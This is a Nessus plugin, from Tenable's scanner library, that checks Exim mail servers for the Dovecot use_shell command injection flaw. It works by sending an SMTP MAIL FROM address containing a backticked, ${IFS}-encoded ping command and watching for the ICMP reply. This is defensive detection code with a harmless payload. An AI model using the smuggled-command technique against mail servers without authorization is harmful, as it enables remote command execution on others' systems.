#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66373);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/05/20 13:54:16 $");

  script_bugtraq_id(60465);
  script_osvdb_id(93004);
  script_xref(name:"EDB-ID", value:"25297");
  script_xref(name:"EDB-ID", value:"25970");

  script_name(english:"Exim with Dovecot use_shell Command Injection");
  script_summary(english:"Tries to send an email that executes a command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A mail transfer agent running on the remote host has a shell command
injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote MTA (which appears to be Exim) has a shell command execution
vulnerability.  Dovecot is commonly used as a local delivery agent for
Exim.  The Dovecot documentation has an insecure example for how to
configure Exim using the 'use_shell' option.  If a host is using this
configuration, it is vulnerable to command injection. 

A remote, unauthenticated attacker could exploit this by sending an
email to the MTA, resulting in arbitrary shell command execution."
  );
  # https://www.redteam-pentesting.de/en/advisories/rt-sa-2013-001/-exim-with-dovecot-typical-misconfiguration-leads-to-remote-command-execution
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?59f1529f");
  script_set_attribute(
    attribute:"solution",
    value:
"Remove the 'use_shell' option from the Exim configuration file.  Refer
to the advisory for more information."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Exim and Dovecot Insecure Configuration Command Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/05/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/05/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:exim:exim");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:dovecot:dovecot");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"SMTP problems");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencie("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("smtp_func.inc");

# Get the SMTP port
port = get_service(svc:"smtp", default:25, exit_on_fail:TRUE);
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

# unless report paranoia is set to paranoid, try to make sure that
# this looks like exim before attempting the PoC
if (report_paranoia < 2)
{
  banner = get_smtp_banner(port:port);
  if (!banner) audit(AUDIT_NO_BANNER, port);
  else if ('Exim' >!< banner) audit(AUDIT_NOT_LISTEN, 'Exim', port);
}

# Open the socket
socket = open_sock_tcp(port);
if (!socket) audit(AUDIT_SOCK_FAIL, port);

# Receive the first line
header = recv_line(socket:socket, length:1024);
if (!header) audit(AUDIT_RESP_NOT, port, 'a new connection');

# Send the EHLO
from_domain = 'example.com';
ehlo_request = 'EHLO ' + from_domain + '\r\n';
send(socket:socket, data:ehlo_request);

# this is Nessus's IP address, which is needed for the command line execution below
# (the PoC will attempt to ping Nessus)
nessus_ip = this_host();

# Parse the options
while(TRUE)
{
  # Get the next options line
  options = recv_line(socket:socket, length:1024);

  # Parse it to make sure it's not an error
  options = eregmatch(pattern:"^250([ -])(.*)", string:options);
  if (!options)
    audit(AUDIT_RESP_BAD, port, 'EHLO');

  # If possible, use the IP address that the host running Exim knows us as
  # 250-debian Hello domain.com [192.168.103.1]
  if ("Hello" >< options[2])
  {
    options = eregmatch(pattern:"Hello ([^ ]+) \[([0-9.]+)\]", string:options[2]);
    if (!isnull(options))
      nessus_ip = options[2];
  }

  # Check if we're at the end of the options array
  if (options[1] == ' ')
    break;
}

# Send the MAIL FROM (containing the payload) and check for errors
port_val = port + 100000; # a 6 digit value based on the port being tested
ping_pat = strcat(unixtime(), port_val);
shell_cmd = 'ping -p ' + ping_pat + ' -c 3 ' + nessus_ip;
enc_shell_cmd = str_replace(string:shell_cmd, find:' ', replace:'${IFS}');
from = '`' + enc_shell_cmd + '`@' + from_domain;
from_request = 'MAIL FROM: ' + from + '\r\n';
send(socket:socket, data:from_request);
response = recv_line(socket:socket, length:1024);
if ('250' >!< response)
  audit(AUDIT_RESP_BAD, port, 'MAIL FROM (' + response + ')');

# the "to" address needs to be valid in order for payload to be executed.
# the plugin will try to use:
#
# 1) the "to" address provided in the policy
# 2) if no address was provided or it's the default (which is unlikely to work), use exim@fqdn
# 3) if Nessus does not know the host's fqdn, exim@[ip-address]
to = get_kb_item("SMTP/headers/To");
if (!to || to == 'postmaster@[' + get_host_ip() + ']')
{
  username = 'exim';

  # unable to determine the target's FQDN. this won't work against a default
  # Exim configuration, but is worth a shot
  if (get_host_name() == get_host_ip())
    to = username + '@[' + get_host_ip() + ']'; # user@[ip-address]
  else
  {
    # get_host_name() is supposed to return a FQDN. e.g., mail.example.com.
    # the subdomain is unlikely to be part of a valid email address, and
    # the plugin will assume anything other than the last two parts of the FQDN
    # can be stripped away. not always true, but should work on many hosts
    domain = get_host_name();
    fqdn = split(domain, sep:'.', keep:TRUE);

    # get_host_name() does not always return a FQDN
    # e.g. "mail" instead of "mail.example.com"
    # stuff should only be stripped away from the name when it's a FQDN
    if (max_index(fqdn) >= 2)
    {
      domain = '';

      for (i = max_index(fqdn) - 2; i < max_index(fqdn); i++)
        domain += fqdn[i];
    }

    to = username + '@' + domain;
  }
}

to_request = 'RCPT TO: ' + to + '\r\n';
send(socket:socket, data:to_request);
response = recv_line( socket:socket, length:1024);
if (
  'domain literals not allowed' >< response ||
  'relay not permitted' >< response
)
{
  exit(1, 'Unable to determine a "to" address suitable for exploitation on port ' + port + ' (attempted ' + to + ').');
}
else if ('250' >!< response)
  audit(AUDIT_RESP_BAD, port, 'MAIL TO (' + response + ')');

# Send the DATA
data_request = 'DATA\r\n';
send(socket:socket, data:data_request);
response = recv_line( socket:socket, length:1024);
if ('354' >!< response)
  audit(AUDIT_RESP_BAD, port, 'DATA (' + response + ')');

# Terminate the email without sending any content
# the PoC is triggered as soon as the DATA is successfully sent
filter = 'icmp and icmp[0] = 8 and src host ' +get_host_ip();
end_request = '\n.\n';
s = send_capture(socket:socket, data:end_request, pcap_filter:filter);
icmp_data = get_icmp_element(icmp:s, element:'data');
smtp_close(socket:socket);

# make sure the data that was supposed to be sent to Nessus by the ping
# command was actually received
if (tolower(ping_pat) >< tolower(hexstr(icmp_data)))
{
  if (report_verbosity > 0)
  {
    report =
      '\nNessus executed the following command :\n\n' +
      shell_cmd + '\n\n' +
      'by sending an email using the following SMTP commands :\n\n' +
      crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n' +
      ehlo_request +
      from_request +
      to_request +
      data_request +
      end_request +
      crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n' +
      '\nwhich caused the host to send Nessus the following ICMP data :\n\n' +
      hexstr(icmp_data) + '\n';
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else
{
  audit(AUDIT_LISTEN_NOT_VULN, 'SMTP server', port);
}

